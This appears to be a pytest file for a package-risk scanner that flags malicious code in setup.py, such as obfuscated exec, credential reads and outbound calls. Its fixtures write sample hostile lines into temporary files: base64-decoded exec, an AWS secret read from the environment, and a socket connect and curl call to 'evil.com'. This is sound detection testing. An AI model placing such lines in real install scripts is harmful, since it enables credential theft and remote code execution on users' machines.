"""Tests for code pattern detection heuristic (v0.3.0)."""

from __future__ import annotations

from pathlib import Path

import pytest

from alterks.heuristics import (
    CODE_PATTERNS_VERSION,
    _find_inspectable_files,
    _score_code_patterns,
)


# ---------------------------------------------------------------------------
# Pattern version constant
# ---------------------------------------------------------------------------

class TestCodePatternsVersion:
    def test_version_is_set(self):
        assert CODE_PATTERNS_VERSION == "1.1"


# ---------------------------------------------------------------------------
# _find_inspectable_files
# ---------------------------------------------------------------------------

class TestFindInspectableFiles:
    def test_finds_setup_py(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text("x = 1")
        (tmp_path / "other.py").write_text("y = 2")
        files = _find_inspectable_files(tmp_path)
        names = {f.name for f in files}
        assert "setup.py" in names
        assert "other.py" not in names

    def test_finds_init_py(self, tmp_path: Path):
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("import os")
        files = _find_inspectable_files(tmp_path)
        assert any(f.name == "__init__.py" for f in files)

    def test_no_py_files(self, tmp_path: Path):
        (tmp_path / "data.txt").write_text("hello")
        files = _find_inspectable_files(tmp_path)
        assert len(files) == 0


# ---------------------------------------------------------------------------
# _score_code_patterns — Malicious patterns (T3)
# ---------------------------------------------------------------------------

class TestScoreCodePatternsMalicious:
    def test_base64_exec(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.85
        assert "base64" in reason.lower() or "exec" in reason.lower() or "obfuscated" in reason.lower()
        assert path is not None

    def test_exec_compile(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "exec(compile(open('payload.py').read(), 'p', 'exec'))"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.80
        assert path is not None

    def test_environ_credential_theft(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import os\ntoken = os.environ['AWS_SECRET_ACCESS_KEY']"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.70
        assert "environment" in reason.lower() or "environ" in reason.lower()

    def test_network_call_in_setup(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import socket\nsocket.connect(('evil.com', 1234))"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.70

    def test_subprocess_in_setup(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import subprocess\nsubprocess.Popen(['curl', 'http://evil.com'])"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.70

    def test_ctypes_loading(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import ctypes\nctypes.cdll.LoadLibrary('evil.so')"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.60

    def test_hex_escaped_string(self, tmp_path: Path):
        hex_payload = "\\x68" * 25  # 25 hex escapes
        (tmp_path / "setup.py").write_text(
            f's = "{hex_payload}"'
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.60
        assert "hex" in reason.lower()

    def test_multiple_findings_escalate(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "import base64, os, subprocess\n"
            "exec(base64.b64decode('abc'))\n"
            "os.environ['AWS_SECRET_ACCESS_KEY']\n"
            "subprocess.Popen(['curl', 'http://evil.com'])\n"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score >= 0.90
        assert "more finding" in reason


# ---------------------------------------------------------------------------
# _score_code_patterns — Benign code (T4 partial)
# ---------------------------------------------------------------------------

class TestScoreCodePatternsBenign:
    def test_none_extracted_dir(self):
        score, reason, path, lines = _score_code_patterns(None)
        assert score == 0.0
        assert path is None

    def test_no_py_files(self, tmp_path: Path):
        (tmp_path / "data.csv").write_text("a,b,c")
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score == 0.0
        assert "No Python source" in reason

    def test_clean_setup_py(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(
            "from setuptools import setup\n"
            "setup(name='mypkg', version='1.0')\n"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score == 0.0

    def test_network_call_in_init_not_flagged(self, tmp_path: Path):
        """Network calls in __init__.py (not setup.py) should not flag."""
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text(
            "import requests\nresponse = requests.get('https://api.example.com')\n"
        )
        score, reason, path, lines = _score_code_patterns(tmp_path)
        assert score == 0.0


# ---------------------------------------------------------------------------
# Integration with compute_risk
# ---------------------------------------------------------------------------

class TestComputeRiskWithCodePatterns:
    def test_code_patterns_factor_present(self, tmp_path: Path):
        """compute_risk should include a code_patterns factor when dir is given."""
        from alterks.heuristics import compute_risk
        from tests.test_heuristics import _make_meta

        (tmp_path / "setup.py").write_text(
            "exec(base64.b64decode('payload'))"
        )
        meta = _make_meta()
        risk = compute_risk("testpkg", "1.0.0", meta, extracted_dir=tmp_path)

        factor_names = [f.name for f in risk.risk_factors]
        assert "code_patterns" in factor_names

        cp_factor = next(f for f in risk.risk_factors if f.name == "code_patterns")
        assert cp_factor.score > 0
        assert cp_factor.file_path is not None

    def test_no_dir_skips_code_patterns(self):
        """Without extracted_dir, code_patterns should score 0 or have empty reason."""
        from alterks.heuristics import compute_risk
        from tests.test_heuristics import _make_meta

        meta = _make_meta()
        risk = compute_risk("testpkg", "1.0.0", meta, extracted_dir=None)

        factor_names = [f.name for f in risk.risk_factors]
        assert "code_patterns" in factor_names
        cp_factor = next(f for f in risk.risk_factors if f.name == "code_patterns")
        assert cp_factor.score == 0.0
